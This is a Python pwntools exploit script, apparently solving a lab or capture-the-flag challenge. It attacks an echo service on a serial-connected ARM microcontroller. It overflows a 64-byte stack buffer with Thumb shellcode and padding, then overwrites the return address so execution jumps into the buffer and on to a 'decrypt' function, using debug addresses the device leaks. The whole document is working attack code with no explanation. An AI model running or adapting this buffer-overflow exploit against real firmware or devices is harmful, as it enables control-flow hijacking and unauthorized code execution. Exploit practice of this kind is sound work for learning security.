#!/bin/env python3

'''
Initialization complete!
[Debug] main at 0x10000385.
[Debug] echo at 0x10000351.
[Debug] decrypt at 0x10000415.
Echo service running.
[Debug] buff at 0x20041ea8.
Input: XXX
Output: XXX
'''

from pwn import *
from time import sleep
import sys

io = serialtube("/dev/ttyACM0", baudrate=115200)

def flatl(x):
    return flat(x, endianness="little")

BUFF_LEN = 64
BUFF_ADDR = 0x20041ea8
DECRYPT = 0x10000415

SHELLCODE = b"".join([
    b"\x45\x21", # movs r1, #69
    b"\x00\xbd", # pop {pc}
])

PAYLOAD = b"".join([
    SHELLCODE,
    b"A"*(BUFF_LEN-len(SHELLCODE)),
    b"XXXX",
    flatl(BUFF_ADDR | 0x1), # thumb instruction need | 0x1 for address
    flatl(DECRYPT),
    b"\n"
])

io.recv(timeout=0.1)
#io.send_raw(b"A"*63+b"\n")
io.send_raw(PAYLOAD)
while True:
    try:
        res = io.recvline()
        print(res.decode("utf-8"), end="")
    except:
        break
